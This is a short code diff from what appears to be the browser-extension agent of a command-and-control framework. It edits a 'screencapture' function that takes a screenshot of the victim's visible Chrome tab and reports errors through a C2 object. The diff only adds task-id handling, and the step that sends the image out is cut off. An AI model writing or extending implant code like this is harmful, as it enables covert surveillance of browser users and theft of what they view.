@@ -1,7 +1,7 @@
 screencapture = function(params){
     chrome.tabs.captureVisibleTab(null, function(img) {
-        // send back the base64encoded image
-        //console.log('Image '+img.toString());
+        taskid = params['taskid'];
+        tasktype = params['tasktype'];
         if (img === undefined) {
             C2.sendError(taskid, tasktype);
         } else {
